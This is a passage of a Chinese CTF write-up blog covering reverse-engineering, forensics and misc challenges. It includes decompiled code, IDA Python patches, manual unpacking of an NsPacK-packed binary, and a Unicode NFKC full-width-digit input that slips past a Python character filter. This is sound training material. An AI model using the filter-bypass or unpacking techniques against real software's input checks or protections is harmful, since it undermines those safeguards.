43 data0[i] = func0(data[i]); 44 break; 45 case 1: 46 data0[i] = func1(data[i]); 47 break; 48 case 2: 49 data0[i] = func2(data[i]); 50 break; 51 case 3: 52 data0[i] = func3(data[i]); 53 break; 54 case 4: 55 data0[i] = func4(data[i]); 56 break; 57 default: 58 break; 59 } 60 printf(\u0026#34;%c\u0026#34;, data0[i]); 61 } 62} flag{Wh4t@6eaut1fu1$lower}_\n做题的时候出了一些问题。我最开始在脚本中写入密文时，顺序是 6C E1 ... EF FA，这样符合反编译的代码，但是运行脚本后会输出乱码。因此需要通过动态调试，我才能在内存中找到正确的顺序，即 7F 7E ... 62 FA。\n攻防世界 riskv-and-reward 题目附件拖到 DIE 里，程序使用了 RISC-V 架构\n因此拖进 IDA 里的时候，应该手动选一个 RISC 架构\n汇编指令看不了一点，F5 也罢工了，唯一有用的是找到了一个字符串，而且没有显示交叉引用。\n这个字符串里有上下花括号，应该是一个乱序的 flag，怀疑是栅栏密码。不过栅栏密码遍历解密之后没有找到什么有用的信息，遂放弃，转用 Ghidra 分析。\n在 Ghidra 里找到这一字符串，其中显示了引用它的函数 FUN_0001232c()，并且可以将该函数反编译。伪代码如下：\n1undefined8 FUN_0001232c(void) 2 3{ 4 int aiStack_d8 [32]; 5 undefined auStack_58 [68]; 6 int local_14; 7 8 FUN_00012524(auStack_58,\u0026amp;DAT_00011040,0x40); 9 FUN_00012524(aiStack_d8,\u0026amp;DAT_00011080,0x80); 10 for (local_14 = 0; local_14 \u0026lt; 0x20; local_14 = local_14 + 1) { 11 FUN_00012724(auStack_58[aiStack_d8[local_14]]); 12 } 13 FUN_00012724(10); 14 return 0; 15} 根据以下几点：\n0x40 与 0x80 恰好分别是 DAT_00011040 与 DAT_00011080 的大小 DAT_00011080 中每隔三个 0x00 会出现一个字节的有效数据，而 aiStack_d8 的类型为 int FUN_00012724(auStack_58[aiStack_d8[local_14]]) 中下标嵌套下标，似乎是在查表，那么 DAT_00011040 是乱序的 flag 根据变量名来看 auStack_58 与 aiStack_d8 的距离恰好是 0x80 我们不妨猜测，FUN_00012524() 函数是 memcpy() 函数，FUN_00012724()，DAT_00011040 中存储的是乱序 flag，DAT_00011080 中存储的是 flag 中每个字符的顺序。\n上脚本试试\n1seq = [0x28, 0x21, 0x2F, 0x34, 0x2D, 0x36, 0x06, 0x1F, 0x25, 0x3B, 0x29, 0x03, 0x37, 0x3E, 0x1B, 0x05, 0x22, 0x13, 0x14, 0x3A, 0x31, 0x30, 0x1A, 0x10, 0x08, 0x23, 0x07, 0x24, 0x3C, 0x2C, 0x00, 0x18] 2string = \u0026#34;tjb3csFt0rrutrh_wiv5__fi}k_1ih`{xIcrhsoyBmyw1CyT3rvxStT_jq40_zrq\u0026#34; 3 4for i in seq: 5 print(string[i], end=\u0026#39;\u0026#39;) BITSCTF{s0m3_r1sc5_4r3_w0rth_1t}\n梅津美治郎 一道动调题，题目名字和描述都好怪，而且和题目内容没什么关系。\n先解释几个函数\nGetModuleHandleA() 语法如下：\n1HMODULE GetModuleHandleA( 2 [in, optional] LPCSTR lpModuleName 3); 参数 [in, optional] LPCSTR lpModuleName 是待加载的模块名称，函数返回值是指定模块的句柄。\nGetProcAdress() 语法如下：\n1FARPROC GetProcAddress( 2 [in] HMODULE hModule, 3 [in] LPCSTR lpProcName 4); 参数 [in] hModule 是包含函数或变量的句柄，[in] lpProcName 是函数或变量名，函数返回值为函数或变量的地址。\n看程序\n程序没有加壳，直接进 IDA。程序前面放了一堆数，后面是程序的核心。\nStr2 似乎似乎就是明文，strcmp(Str1, Str2) 里是检测第一次输入的内容，直接输入 \u0026quot;r0b0RUlez!\u0026quot; 就可以过第一层判断。\n第二层判断在函数 sub_40157F() -\u0026gt; sub_401547() 内\n即将第二层密码与 dword_40AD98 里的内容异或 2 作比较。需要打断点动调才能看到 dword_40AD98 里的内容。\n异或之后得到第二段密码，拼起来就是 flag _flag{r0b0RUlez!w3lld0ne}\n这道题的诡异之处在于，程序并没有按照代码里写的顺序执行，而且程序几乎所有在运行期间输出的字符串都是在程序运行的过程中计算生成的，而非一开始就存储在数据里。不知道程序运行到哪里，对于一道需要动态调试的题目来说，确实有一定迷惑性。\nbabyarm TNND！flag 错误，官方 WP 错误！！！\n这道题的程序使用了 ARM 架构汇编，我配置 QEMU 模拟器调试程序未果。故纯静态分析得到 flag。此外，我能找到的 IDA 8.3 都只支持 x64/x86 反编译器。遂使用 IDA 7.7。\n一上来就爆红，先强制分析，手动去花指令。\n下面都是类似的操作，随后重新分析。\n不难看出，左侧出现了 main() 函数。F5 一键反编译后不难看出，输入的 flag 被切成两部分进行判断。\n1// bad sp value at call has been detected, the output may be wrong! 2int __fastcall main(int a1, char **a2, char **a3) 3{ 4 const void *v3; // r2 5 int v4; // r4 6 int v6; // r3 7 _DWORD v8[3]; // [sp+8h] [bp-78h] 8 char v9; // [sp+14h] [bp-6Ch] 9 _DWORD v10[3]; // [sp+18h] [bp-68h] 10 char v11[12]; // [sp+24h] [bp-5Ch] BYREF 11 _DWORD v12[2]; // [sp+30h] [bp-50h] BYREF 12 _DWORD v13[3]; // [sp+38h] [bp-48h] 13 int (__fastcall *v14)(_DWORD, _DWORD); // [sp+44h] [bp-3Ch] 14 int v15; // [sp+48h] [bp-38h] 15 int v16; // [sp+4Ch] [bp-34h] 16 int v17; // [sp+50h] [bp-30h] 17 void *v18; // [sp+54h] [bp-2Ch] 18 void *v19; // [sp+58h] [bp-28h] 19 int fd; // [sp+5Ch] [bp-24h] 20 void *addr; // [sp+60h] [bp-20h] 21 int v22; // [sp+64h] [bp-1Ch] 22 int i; // [sp+68h] [bp-18h] 23 int v24; // [sp+6Ch] [bp-14h] 24 void *dest; // [sp+70h] [bp-10h] 25 char v26[4]; // [sp+74h] [bp-Ch] BYREF 26 27 memset(v11, 0, sizeof(v11)); 28 v12[0] = 0; 29 v12[1] = 0; 30 v13[0] = 0; 31 *(v13 + 3) = 0; 32 fd = open(\u0026#34;/dev/zero\u0026#34;, 0); 33 addr = mmap(0, 0x1000u, 7, 2, fd, 0); 34 v19 = addr; 35 dest = 0; 36 memcpy(0, v3, 0xC0u); 37 sub_10684(addr); 38 v18 = addr; 39 v16 = addr + 64; 40 v17 = addr + 128; 41 v15 = addr + 128; 42 v24 = 0; 43 v10[1] = addr + 64; 44 v10[2] = addr + 128; 45 v8[0] = 0x4FFED263; 46 v8[1] = 0x3F00D9B9; 47 v8[2] = 0x504380A0; 48 v9 = 0x55; 49 for ( i = 0; i \u0026lt;= 12; ++i ) 50 { 51 v14 = v10[i % 3]; 52 v4 = *(v8 + i); 53 if ( v4 != v14(v11[i], byte_2103C[i]) ) 54 { 55 puts(\u0026#34;Operation failed!!!\u0026#34;); 56 return -1; 57 } 58 } 59 puts(\u0026#34;Check next section\u0026#34;); 60 v13[2] = 6; 61 while ( v22 \u0026lt;= 5 ) 62 { 63 v6 = v22 \u0026amp; 1; 64 if ( v22 \u0026lt; 0 ) 65 v6 = -v6; 66 (*\u0026amp;v26[4 * v6 - 116])(\u0026amp;byte_2104C[6 * v22++]); 67 } 68 if ( sub_10770(byte_2104C, v12 + 1) ) 69 puts(\u0026#34;you find the whole flag!\u0026#34;); 70 else 71 puts(\u0026#34;what a pity!\u0026#34;); 72 munmap(addr, 0x1000u); 73 return 0; 74} 第一部分的 v14 是一个函数指针，由三个函数循环对我们输入内容的前 13 位及已知的 byte_2103C 中的数据进行操作，并与 已知的 v4 进行比对。IDA 在分析这段代码时的表现很差。有函数 *sub_105D4() 包含在 init_array 中（在 IDA View-A 中可见），先于 main() 函数执行。该函数对 byte_21088 进行操作，byte_21088 大小为 0xBF。\n1void *sub_105D4() 2{ 3 void *result; // r0 4 char dest[192]; // [sp+4h] [bp-C8h] BYREF 5 unsigned int i; // [sp+C4h] [bp-8h] 6 7 result = memcpy(dest, \u0026amp;unk_10D28, sizeof(dest)); 8 for ( i = 0; i \u0026lt;= 0xBF; ++i ) 9 byte_21088[i] ^= dest[i]; 10 return result; 11} 有 sub_10684() 对 v1 中的数据进行操作，v1 大小同样是 0xBF，不妨猜测此数据块与函数 *sub_105D4() 中的 byte_21088 是指向的同一段数据。\n1int sub_10684() 2{ 3 int result; // r0 4 int v1; // [sp+4h] [bp-18h] 5 char v2[8]; // [sp+Ch] [bp-10h] BYREF 6 unsigned int i; // [sp+14h] [bp-8h] 7 8 result = *\u0026#34;SECRET\u0026#34;; 9 strcpy(v2, \u0026#34;SECRET\u0026#34;); 10 for ( i = 0; i \u0026lt;= 0xBF; ++i ) 11 { 12 result = *(v1 + i); 13 *(v1 + i) = v2[i % 6] ^ result; 14 } 15 return result; 16} 下面为 byte_21088 中数据，由 main() 函数中 mmap() 函数猜测，这一段为 SMC。这一段数据长度也刚好为 0xBF，因此上述两个函数是 SMC 函数。由于不能动态调式，我们用 IDA Python 脚本修改这段数据，并重新分析。\n1cipher_start = 0x10D28 2opcode_start = 0x21088 3cipher = \u0026#34;SECRET\u0026#34; 4 5for addr in range(0, 0xC0): 6 cip = int(idc.get_wide_byte(cipher_start + addr)) 7 val = int(idc.get_wide_byte(opcode_start + addr)) 8 new_val = cip ^ val ^ ord(cipher[addr % 6]) 9 ida_bytes.patch_byte(opcode_start + addr, new_val) 这样我们就获得了 sub_21088()、sub_120C8、sub_21108() 三个函数，与 main() 函数中 v18 = addr, v16 = addr + 64, v17 = addr + 128; 中的地址偏移量相对应，也正好是 v14 中的三个函数。此时可以解出 flag 前半段。\n1key = [0xFD, 0x9A, 0x9F, 0xE8, 0xC2, 0xAE, 0x9B, 0x2D, 0xC3, 0x11, 0x2A, 0x35, 0xF6] 2cip = [0x63, 0xD2, 0xFE, 0x4F, 0xB9, 0xD9, 0x00, 0x3F, 0xA0, 0x80, 0x43, 0x50, 0x55] 3 4for i in range(0, 13): 5 if i % 3 == 0: 6 print(chr((cip[i] - key[i]) \u0026amp; 0x7F), end=\u0026#34;\u0026#34;) 7 if i % 3 == 1: 8 print(chr((cip[i] + key[i]) \u0026amp; 0x7F), end=\u0026#34;\u0026#34;) 9 if (i % 3) == 2: 10 print(chr((cip[i] ^ key[i]) \u0026amp; 0x7F), end=\u0026#34;\u0026#34;) flag{welcome_\n后半段 flag 的判断是通过 sub_10770() 函数实现的。\n1int __fastcall sub_10770(int a1, int a2) 2{ 3 _DWORD v4[3]; // [sp+Ch] [bp-20h] 4 char v5; // [sp+18h] [bp-14h] 5 int i; // [sp+1Ch] [bp-10h] 6 int v7; // [sp+20h] [bp-Ch] 7 int v8; // [sp+24h] [bp-8h] 8 9 v8 = 4; 10 v4[0] = 0x41203E53; 11 v4[1] = 0xB242C1E; 12 v4[2] = 0x52372836; 13 v5 = 0xE; 14 for ( i = 0; i \u0026lt;= 12; ++i ) 15 { 16 *(a2 + i) ^= *(v4 + i); 17 switch ( *(a2 + i) ) 18 { 19 case \u0026#39;a\u0026#39;: 20 --v8; 21 break; 22 case \u0026#39;d\u0026#39;: 23 ++v8; 24 break; 25 case \u0026#39;s\u0026#39;: 26 ++v7; 27 break; 28 case \u0026#39;w\u0026#39;: 29 --v7; 30 break; 31 default: 32 break; 33 } 34 if ( *(a1 + 6 * v7 + v8) == \u0026#39;*\u0026#39; ) 35 { 36 puts(\u0026#34;Boom!!!\u0026#34;); 37 return 0; 38 } 39 } 40 return 1; 41} 似乎是一个迷宫，通过 WASD 控制位移，但是是异或处理过后成为 WASD。传入这个函数的另一个参数 byte_2104C 似乎真的像一个迷宫。\n不过这个迷宫不大对劲。在 main() 函数里调用 sub_10770() 前先有 (*\u0026amp;v26[4 * v6 - 116])(\u0026amp;byte_2104C[6 * v22++]);。而 (*\u0026amp;v26[4 * v6 - 116]) 指向的函数似乎找不到。不过好在这道题里出现的函数相当少，我们不妨一个一个找找看。最后发现 sub_104FC() 与 sub_10568() 函数中 i \u0026lt;= 5 的循环跳出条件与 main() 中 v22 \u0026lt;= 5 竟然出奇地相似。故猜测这两个函数对迷宫进行初始化。不妨靠这个找出初始化后的迷宫，经过尝试，使用下面的脚本可以大体改成组成迷宫的字符串。\n1start = 0x2104C 2end = 0x21088 3 4for addr in range(start, end): 5 data = int(idc.get_wide_byte(addr)) 6 if chr(data) == \u0026#39;T\u0026#39; or data == 0x88: 7 new_data = data \u0026gt;\u0026gt; 1 8 else: 9 new_data = data ^ 0x10 10 ida_bytes.patch_byte(addr, new_data) 这只是一个猜测，作出这样猜测的依据是 sub_10770() 函数中 *(a1 + 6 * v7 + v8) == '*' 的判断。据此也能判断出这一由 60 个字符绘制出的迷宫一共有 6 列 10 行。通过以下代码打印出可能的迷宫：\n1print(\u0026#39;\\n\u0026#39;) 2maze = \u0026#34;******* E**P***** *****P***** *****P***** *****D*******\u0026#34; 3for i in range(0, 6): 4 print(maze[i * 10: i * 10 + 10]) 5 6\u0026#39;\u0026#39;\u0026#39; 7 output: 8 ****** 9 * E* 10 *P**** 11 * **** 12 *P**** 13 * * 14 ****P* 15 **** * 16 ****D* 17 ****** 18\u0026#39;\u0026#39;\u0026#39; 另外根据 v8 = 4; 可以知道，迷宫的七点在某行第四列。经过尝试，迷宫起点为 E 点，终点为 D 点。经过的路径为 aaassssdddsss，而这是经过异或后的结果。写出脚本解出第二部分 flag。\n1path = \u0026#34;aaassssdddsss\u0026#34; 2crypt = [0x53, 0x3E, 0x20, 0x41, 0x1E, 0x2C, 0x24, 0xB, 0x36, 0x28, 0x37, 0x52, 0xE] 3for i in range(0, 13): 4 print(chr(ord(path[i]) ^ crypt[i]), end=\u0026#39;\u0026#39;) 2_A2m_WoRLD!}\n完整脚本：\n1key = [0xFD, 0x9A, 0x9F, 0xE8, 0xC2, 0xAE, 0x9B, 0x2D, 0xC3, 0x11, 0x2A, 0x35, 0xF6] 2cip = [0x63, 0xD2, 0xFE, 0x4F, 0xB9, 0xD9, 0x00, 0x3F, 0xA0, 0x80, 0x43, 0x50, 0x55] 3 4for i in range(0, 13): 5 if i % 3 == 0: 6 print(chr((cip[i] - key[i]) \u0026amp; 0x7F), end=\u0026#34;\u0026#34;) 7 if i % 3 == 1: 8 print(chr((cip[i] + key[i]) \u0026amp; 0x7F), end=\u0026#34;\u0026#34;) 9 if (i % 3) == 2: 10 print(chr((cip[i] ^ key[i]) \u0026amp; 0x7F), end=\u0026#34;\u0026#34;) 11 12# part 1 13 14path = \u0026#34;aaassssdddsss\u0026#34; 15 16crypt = [0x53, 0x3E, 0x20, 0x41, 0x1E, 0x2C, 0x24, 0xB, 0x36, 0x28, 0x37, 0x52, 0xE] 17for i in range(0, 13): 18 print(chr(ord(path[i]) ^ crypt[i]), end=\u0026#39;\u0026#39;) 19 20# part 2 flag{welcome_2_A2m_WoRLD!}\nMISC - ext3 题目附件是一块磁盘的数据（有好多 00 ），有头绪但不多。我强行在 010 Editor 里找可能的关键字，找到了一个文件 flag.txt 的路径 ~root/Desktop/file/O7avZhikgKgbF/flag.txt，最后通过尝试“Zmxh”关键字得到 Base64 编码后的 flag，ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0= 。\n解码后得到 flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj}\n然而这道题正确的解法不应该是这样的。如果出题人没有使用 Base64 编码，或者使用了套娃加密的方式，那我就难以用这个方法得到 flag 了。\n这是一个 Linux 下的 ext3 格式磁盘，而且是把整坨数据都存储进去了。我妄图将其后缀改为 .iso，.img，.rar，但是在我打开文件的时候系统又会提醒我文件已经损坏。\n怎么办呢？既然这块磁盘适配 Linux 文件系统，为什么我不将它挂载到 Linux 里呢？这叫做原汤化原食。把磁盘拖进 Kali Linux，使用命令 sudo mount '/home/jackgdn/Desktop/f1fc23f5c743425d9e0073887c846d23' /mnt 可以将磁盘挂载到 /mnt 文件夹下。根据刚才在 010 Editor 里找到的路径，可以轻松得到 Base64 编码后的 flag。\n做完题后卸载磁盘，使用 sudo umount /mnt 命令。\nBUUCTF MISC - 面具下的 flag 题目附件是一张图片。\nmianju.jpg\n这张图片里大概率是藏了什么东西。我们不妨用 binwalk 找找图片里的“好东西”。在 Linux 里使用 binwalk -e '/home/jackgdn/Desktop/temp files/mianju.jpg' 命令，binwalk 就自动分离出了两个文件，74DFE.zip 与 flag.vmdk。其中 74DFE.zip 解压出的文件就是 flag.vmdk。\n这一步也可以用另一种方法来完成。众所周知，.jpg 格式文件的文件尾是 FF D9,在文件尾后的内容都不会被读取为图像的一部分。因此我们不妨使用 010 Editor 里找到这一文件尾，而后面又刚好是 PK 文件头。从这里到最下面 50 4B 05 06 的 .zip 文件尾部分，都是压缩文件部分。\n把前面多余部分删除，剩余部分保存为 mianju.zip\n哦？竟然有加密。大概率是伪加密吧。还是用 010 Editor，将压缩源文件目录区域的 09 00 改为 00 00，密码就会消失。\n拿到了一个虚拟磁盘文件。先试试头铁的办法：直接搜。这次运气不错，找到了一个 Ook!\n但是这个 Ook! 似乎是损坏的。往下搜索，发现还有一坨 Ook!\n不错，但是这里只有个半个 flag：\n_i5_funny!}\n根据刚才搜索到的内容，我们不妨假设前一半 flag 的后缀也是 .txt，因此搜索 \u0026quot;t x t\u0026quot; 即 74 00 78 00 74。\n似乎是 brainfuck：\n但是实际上这一段也是损坏的，正确的 brainfuck 也是在下面的位置。可以借出来第一段 flag。随后就可以拼成一整个 flag。\nflag{N7F5_AD5_i5_funny!}\n这一步还有另一个思路，即像攻防世界里 ext3 这道题一样直接将磁盘挂载到操作系统内。使用 ImDisk 工具挂载虚拟磁盘。\n可惜，即使挂载到操作系统，/key_part_one/NUL 文件依然是不可打开的，/key_part_two/ 下只有一个 where_is_flag_part_two.txt。先在 DiskGenius 里打开虚拟磁盘，可以查看前半段 flag 的内容。\n根据前半段 flag 的提示可以知道，后半段 flag 没有出现是因为 ADS 隐写。使用 lads 找隐写的文件流并打开，就是第二段 flag。此外，alternatestreamview 工具也可以查看 ADS 隐写的文件路径。\n赵师傅也提供了一种方法，将虚拟磁盘文件的后缀改为 .7z，并放到 Linux 系统中解压，同样可以得到完整的文件。\nADS 文件隐写是在微软的 NTFS 格式的文件系统内使用的，而 Linux 使用 ext4 文件系统，因此在 Linux 里 ADS 隐写的文件就直接出现了；9982 师傅推测，NUL 文件之所以不能打开是因为 NTFS 头损坏，并不影响文件在 Linux 系统里被读取。\nNSSCTF test your Debugger 若至签到题。不管你输入什么，程序都会把 flag 算出来，直接打断点看内存就可以。它甚至贴心地告诉你，在这里打断点，生怕我拿不到 flag。\nNSSCTF{44d52a77-92ea-413e-98c4-ff5846fd387d}\npwn - nc_pwnre 我的评价是：挂 pwn 头卖 re 肉。\nnc 连接到环境，出现了一段汇编：\n1pwn? re?no no no,this is just an easy nc-test. 2 3loc_40116D: 4mov eax, [ebp+i] 5add eax, 1 6mov [ebp+i], eax 7loc_401176: 8mov ecx, [ebp+Str] 9push ecx 10call _strlen 11add esp, 4 12cmp [ebp+i], eax 13jge short loc_40119D\t14mov edx, [ebp+Str] 15add edx, [ebp+i] 16movsx eax, byte ptr [edx] 17xor eax, 10h 18mov ecx, [ebp+Str] 19add ecx, [ebp+i] 20mov [ecx], al 21jmp short loc_40116D 22maybe the result is talking about xor? 23My result: 240x44,0x7c,0x5e,0x44,0x41,0x21,0x42,0x57,0x75,0x21,0x74,0x56,0x44,0x57,0x5d,0x67,0x44,0x46,0x29,0x45,0x5d,0x56,0x29,0x67,0x46,0x22,0x25,0x76,0x74,0x6a,0x52,0x69,0x5d,0x47,0x41,0x78,0x76,0x41,0x2d,0x2d 25 26your answer? 汇编逻辑简单，将字符串中的某一个字符存入 eax 寄存器后再做一次 xor eax, 10h 操作，随后对下一个字符做相同操作。我只能说，把逆向题出道远程服务器里它也是逆向题。\n1flag = [0x44,0x7c,0x5e,0x44,0x41,0x21,0x42,0x57,0x75,0x21,0x74,0x56,0x44,0x57,0x5d,0x67,0x44,0x46,0x29,0x45,0x5d,0x56,0x29,0x67,0x46,0x22,0x25,0x76,0x74,0x6a,0x52,0x69,0x5d,0x47,0x41,0x78,0x76,0x41,0x2d,0x2d] 2for i in flag: 3 print(chr(i ^ 0x10), end = \u0026#39;\u0026#39;) 得到一串 Base64：TlNTQ1RGe1dFTGMwTV9UMF9wV25fdzByMWQhfQ==，解码之后是 NSSCTF{WELc0M_T0_pWn_w0r1d!}。不过这不是最终 flag，需要把它填到终端里，然后获得远程主机的权限。\nNSSCTF{7f840e08-33c7-44a3-8c01-d4a34362de59}\n","link":"https://jackgdn.github.io/post/%E8%BF%91%E6%9C%9F%E8%A7%A3%E9%A2%98_20230113/","section":"post","tags":["Reverse","MISC","Pwn","WP"],"title":"近期解题 2024.1.13"},{"body":"擂台赛 - 123456789 题目源代码如下\n1from secret import flag 2data = input(\u0026#39;\u0026gt; \u0026#39;) 3assert len(data) \u0026lt;= 9 and all(i not in \u0026#39;123456789\u0026#39; for i in data) and int(data) == 123456789 4print(flag) 看上去不是很麻烦。题目会在远程服务器上运行，secret 模块及其中的 flag 常量都存储在远程服务器上。 如果我们输入的 data 能够满足这个 assert 中的条件，flag 就会自己跳出来。\n条件如下：\ndata 的长度小于等于 9\ndata 中不含 “123456789” 中的任意一个字符\ndata 转化为整型后与 123456789 相等\n似乎条件 2、3 矛盾了，两个条件不可以同时实现。但是真的如此吗？\nUnicode 编码归一化 文字处理软件在实现统一码字符串的搜索和排序时，须考虑到等价性的存在。如果没有此特性的话，用户在搜索时将无法找到在视觉上无法区分的字形。\n通俗来讲，例如说在 Unicode 中合字 ﬃ (U+FB03) 在视觉上等同于 ffi 三个字符拼凑而成，因此需要计算机软件能够识别 ffi 三个字符等同于 ﬃ 合字字符，以便于用户检索。\n实际上的 Unicode 编码归一化的算法比这要更为复杂，并分为了 NFD、NFC、NFKD、NFKC 四种算法，每一种算法都有不同的用处。\n话说回来，这和我们要解决的问题有什么关系吗？Natürlich! 这道题目使用的语言 Python 支持 NFKC ，也就是说，我们应该找到一个由“视觉上相同”的 123456789 字符串。这样的话，这个字符串中的任意一个字符都与 ASCII 编码中的 123456789 不同，而将其强制转化为整型的操作则会被归一为将 ASCII 编码中的 123456789 字符串转化为整型的操作。也就是说，我们需要找到合适的 Unicode 字符。\n这里有一个可以查找 Unicode 字符的网站：List of Unicode Characters of Bidirectional Class “European Number”，经过筛选，我们找到一下几组可能能成功的字符。由于懒得一个个复制，我们不妨遍历一下。\n1// filename: Exp_123456789 2 3public class Exp_123456789 { 4 public static void main(String[] args) { 5 // superscript numbers 6 System.out.printf(\u0026#34;%c%c%c\u0026#34;, \u0026#39;\\u00B9\u0026#39;, \u0026#39;\\u00B2\u0026#39;, \u0026#39;\\u00B3\u0026#39;); 7 for(char i = \u0026#39;\\u2074\u0026#39;; i \u0026lt;= \u0026#39;\\u2079\u0026#39;; i++) { 8 System.out.print(i); 9 } 10 System.out.print(\u0026#39;\\n\u0026#39;); 11 // subscript numbers 12 for(char i = \u0026#39;\\u2081\u0026#39;; i \u0026lt;= \u0026#39;\\u2089\u0026#39;; i++) { 13 System.out.print(i); 14 } 15 System.out.print(\u0026#39;\\n\u0026#39;); 16 // numbers with full stop 17 for(char i = \u0026#39;\\u2488\u0026#39;; i \u0026lt;= \u0026#39;\\u2490\u0026#39;; i++) { 18 System.out.print(i); 19 } 20 System.out.print(\u0026#39;\\n\u0026#39;); 21 //full width numbers 22 for(char i = \u0026#39;\\uFF11\u0026#39;; i \u0026lt;= \u0026#39;\\uFF19\u0026#39;; i++) { 23 System.out.print(i); 24 } 25 } 26} 27 28/* 29output: 30¹²³⁴⁵⁶⁷⁸⁹ 31₁₂₃₄₅₆₇₈₉ 32⒈⒉⒊⒋⒌⒍⒎⒏⒐ 33１２３４５６７８９ 34*/ Oops! 虽然我们找到可以明确知道有哪些字符至少看上去和一般数字一致，但这似乎不能直接判断这些在 Python 中是否可以被归一为一般数字。唉，在 Python 中重新来一遍。\n1code = \u0026#34;assert len(data) \u0026lt;= 9 and all(i not in \u0026#39;123456789\u0026#39; for i in data) and int(data) == 123456789\u0026#34; 2try: 3 data = \u0026#34;¹²³⁴⁵⁶⁷⁸⁹\u0026#34; # superscript numbers 4 exec(code) 5 print(data) 6except: 7 try: 8 data = \u0026#34;₁₂₃₄₅₆₇₈₉\u0026#34; # subscript numbers 9 exec(code) 10 print(data) 11 except: 12 try: 13 data = \u0026#34;⒈⒉⒊⒋⒌⒍⒎⒏⒐\u0026#34; # numbers with full stop 14 exec(code) 15 print(data) 16 except: 17 data = \u0026#34;１２３４５６７８９\u0026#34; # full width numbers 18 exec(code) 19 print(data) 20 21# output: １２３４５６７８９ 看来只有最后一组字符串是可行的。打开题目环境输入这串字符，果然出了 flag！\nflag{U_kn0w_NFKC\u0026amp;Un1c0d3,_r1gh4?}\n攻防世界 - crackme 先拖进 IDA\n哇哦，这个函数数量，这个伪代码恶心程度，很难不让人想到它是加了壳的。现在拖进 DIE 再看看\n果然，有一个 NsPacK 的壳。在网上浏览了一圈没有找到适当的脱壳工具。不妨先试一试曾经尝试过的方法，即运行到程序完全解压后重新分析。把它重新拖进 IDA 并调试\n现在程序运行到这个位置，应该已经解压完成了，接下来重新分析。\n似乎还是老样子……只好自己尝试手脱壳了。这次尝试一下”esp 定律“脱壳法。\n拖进 x64dbg 并直接运行到 pushaf 与 pushad 的位置。pushaf 是将标志位寄存器的值入栈，pushad 是将八个通用寄存器的值入栈。这一步是解压程序运行的开始。\n步过到 call 指令，这条指令会执行解压函数，从而得到真正的程序\n当 eip 指向 call 指令时，我们就可以用 esp 寄存器中存储的地址设置断点了。在内存一窗口中右键地址 -\u0026gt; 断点 -\u0026gt; 硬件，访问 -\u0026gt; 2 字节。随后就能在寄存器窗口看到 DR0 的值已经变了。\n然后直接运行到断点。这时候不难看出 eip 寄存器指向了 popfd 指令，说明程序已经解压完成了。\n紧接着 popfd 指令的是一个跳转到 0x401336 的指令（当前地址 0x40641D），看来是要正式执行程序了。\n步进一次使 eip 指向这一大跳，现在这个跳转过去的地方就是脱过壳的地方了。在插件 -\u0026gt; Scylla -\u0026gt; IAT Autosearch -\u0026gt; Dump，我们就得到了一个新的 dump 过的可执行文件。 当然也许它不可执行……\n不过没有关系。我们已经拿到了脱过壳但不可执行的可执行文件。把它重新拖进 IDA。\n芜湖，这就看上去简单多了。程序的逻辑非常简单，我们输入的字符串长度为 42，而且这个字符串与 byte_402130 中的数据循环异或后需要与 dword_402150 中的数据相同。两组数据我就不摆出来了，直接放脚本。\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstdio\u0026gt; 3#include \u0026lt;cstring\u0026gt; 4 5using namespace std; 6 7int main() 8{ 9 unsigned char chars[] = 10 { 11 0x12, 0x04, 0x08, 0x14, 0x24, 12 0x5C, 0x4A, 0x3D, 0x56, 0x0A, 13 0x10, 0x67, 0x00, 0x41, 0x00, 14 0x01, 0x46, 0x5A, 0x44, 0x42, 15 0x6E, 0x0C, 0x44, 0x72, 0x0C, 16 0x0D, 0x40, 0x3E, 0x4B, 0x5F, 17 0x02, 0x01, 0x4C, 0x5E, 0x5B, 18 0x17, 0x6E, 0x0C, 0x16, 0x68, 19 0x5B, 0x12, 20 }; 21 string tinf = \u0026#34;this_is_not_flag\u0026#34;; 22 for (int i = 0; i \u0026lt; 42; i++) 23 { 24 printf(\u0026#34;%c\u0026#34;, tinf[i % 16] ^ chars[i]); 25 } 26} 27 28// output: flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75} NCTF - Jump For Flag 举办方将其定位到 MISC 方向中，但个人认为这是一道简单的逆向题\n这道题附件是一个 Made With Unity 的小游戏。只要按下空格键跳起来，天上就会随机掉落数个二维码的像素。这些像素块在生成的时候是在它“应该在的位置上”，但是下落的过程中它们在做布尔运动，以至于落到地上后就成了散装二维码。如图\n照这样说，多跳几下实际上是不能让一个二维码完整出现在地面的，它们只会变成一坨（）\n比较简单的一个思路，既然签到题的二维码是整坨落下来，那么可以把第二题的二维码放到签到题里。\n用 dnSpy 打开第二题中的 Assembly-CSharp.dll，可以在 CubeGenerator() 方法里找到方块对象生成时的属性，在后面的 makecube() 方法里找到对方块对象属性的定义。\nCubeGenerator()：\nmakecube()：\n1private void makecube(int x, int y, int z, string col) 2{ 3\tGameObject gameObject = Object.Instantiate\u0026lt;GameObject\u0026gt;(this.cube, new Vector3((float)x, (float)y, (float)z), Quaternion.identity); 4\tMeshRenderer component = gameObject.GetComponent\u0026lt;MeshRenderer\u0026gt;(); 5\tif (col == \u0026#34;black\u0026#34;) 6\t{ 7\tcomponent.material.color = Color.black; 8\t} 9\telse 10\t{ 11\tcomponent.material.color = Color.white; 12\t} 13\tgameObject.GetComponent\u0026lt;Rigidbody\u0026gt;().AddForce(new Vector3(Random.Range(-10f, 10f), 0f, Random.Range(-10f, 10f)), ForceMode.Impulse); 14} CubeGenerator() 中总共创建了 900 个方块对象，而且在每一个 new int[] 中的四个数据分别是 x轴，y轴，z轴与颜色。\n再用 dnSpy 打开签到题的 Assembly-CSharp.dll\nCubeGenerator()：\nmakecube()：\n1private void makecube(int x, int y, int z, string col) 2{ 3\tMeshRenderer component = Object.Instantiate\u0026lt;GameObject\u0026gt;(this.cube, new Vector3((float)x, (float)y, (float)z), Quaternion.identity).GetComponent\u0026lt;MeshRenderer\u0026gt;(); 4\tif (col == \u0026#34;black\u0026#34;) 5\t{ 6\tcomponent.material.color = Color.black; 7\treturn; 8\t} 9\tcomponent.material.color = Color.white; 10} 哇哦，几乎是一样的。也就是说，这个思路基本具有可行性。下面要做的就是把第二题的二维码 900 个方块的数据 Copy-Paste 到签到题里面，然后编译保存。\nNCTF{25d8fdeb-0cb6-4ad4-8da1-788a72e701f0}\nSehr 